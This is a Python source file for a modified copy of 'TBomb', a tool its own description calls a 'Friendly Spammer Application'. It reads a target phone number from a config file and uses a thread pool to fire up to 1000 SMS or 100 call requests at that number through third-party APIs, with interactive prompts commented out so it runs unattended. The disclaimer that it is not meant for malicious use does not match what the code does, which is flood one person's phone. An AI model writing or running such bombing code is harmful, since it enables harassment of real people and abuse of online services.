import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import linecache
from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.provider import APIProvider

def readisdc():
    with open("isdcodes.json") as file:
        isdcodes = json.load(file)
    return isdcodes

#def read():
   # with open("phone.cfg") as file:
       # target = file.read()
    #return target

try:
    country_codes = readisdc()["isdcodes"]
except FileNotFoundError:
    print("Error")



def format_phone(num):
    num = [n for n in num if n in string.digits]
    return ''.join(num).strip()


def get_phone_info():
    while True:
        target = ""
        cc = "91"
        cc = format_phone(cc)
        target = linecache.getline('phone.cfg',1)
        target = format_phone(target)
        if ((len(target) <= 6) or (len(target) >= 12)):
            print(
                "The phone number ({target})".format(target=target) +
                "that you have entered is invalid")
            continue
        return (cc, target)


def pretty_print(cc, target, success, failed):
    requested = success+failed
    print("Bombing is in progress - Please be patient")
    print(
        "Please stay connected to the internet during bombing")
    print("Target       : " + cc + " " + target)
    print("Sent         : " + str(requested))
    print("Successful   : " + str(success))
    print("Failed       : " + str(failed))
    
def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result:
                    success += 1
                else:
                    failed += 1

                pretty_print(cc, target, success, failed)
    print("\n")
    print("Bombing completed!")
    time.sleep(1.5)
    sys.exit()






def selectnode(mode="sms"):
    mode = mode.lower().strip()
    try:

        max_limit = {"sms": 5000, "call": 100, "mail": 200}
        cc, target = "", ""
        if mode in ["sms", "call"]:
            cc, target = get_phone_info()
            if cc != "91":
                max_limit.update({"sms": 100})
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:

                if mode.upper() == "SMS":
                 count = 1000
                else:
                 count = 100

                #message = ("Enter number of {type}".format(type=mode.upper()) +" to send (Max {limit}): ".format(limit=limit))
                #count = int(input((message)).strip())
                if count > limit or count == 0:
                    print("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    print(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                if mode in ["sms"]:
                    delay = 3
                else: 
                    delay = 15

                #delay = float(input(print("Enter delay time (in seconds): ")).strip())
                # delay = 0
                max_thread_limit = (count//10) if (count//10) > 0 else 1

                if mode in ["sms"]:
                    max_threads = 50
                else:
                    max_threads = 1

                #max_threads = int(input(print("Enter Number of Thread (Recommended: {max_limit}): ".format(max_limit=max_thread_limit))).strip())
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            except Exception:
                print("Read Instructions Carefully !!!")
                print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        print("Received INTR call - Exiting...")
        sys.exit()


if sys.version_info[0] != 3:
    print("TBomb will work only in Python v3")
    sys.exit()


description = """TBomb - Your Friendly Spammer Application

TBomb can be used for many purposes which incudes -
\t Exposing the vulnerable APIs over Internet
\t Friendly Spamming
\t Testing Your Spam Detector and more ....

TBomb is not intented for malicious uses.
"""

parser = argparse.ArgumentParser(description=description,
                                 epilog='Coded by SpeedX !!!')
parser.add_argument("-sms", "--sms", action="store_true",
                    help="start TBomb with SMS Bomb mode")
parser.add_argument("-call", "--call", action="store_true",
                    help="start TBomb with CALL Bomb mode")
parser.add_argument("-mail", "--mail", action="store_true",
                    help="start TBomb with MAIL Bomb mode")
parser.add_argument("-u", "--update", action="store_true",
                    help="update TBomb")
parser.add_argument("-c", "--contributors", action="store_true",
                    help="show current TBomb contributors")
parser.add_argument("-v", "--version", action="store_true",
                    help="show current TBomb version")


if __name__ == "__main__":
    args = parser.parse_args()
    if args.mail:
        selectnode(mode="mail")
    elif args.call:
        selectnode(mode="call")
    elif args.sms:
        selectnode(mode="sms")
    else:
        choice = ""
        avail_choice = {"1": "SMS", "2": "CALL",
                        "3": "MAIL (Not Yet Available)"}
        try:
            #while (choice not in avail_choice):
                
                #print("Available Options:\n")
                #for key, value in avail_choice.items():
                    #print("[ {key} ] {value} BOMB".format(key=key,
                                                          #value=value))
                #print()
                #choice = linecache.getline('phone.cfg',2)
                #choice = input(("Enter Choice : "))
            selectnode(mode=linecache.getline('phone.cfg',2))
        except KeyboardInterrupt:
           print("Received INTR call - Exiting...")
            
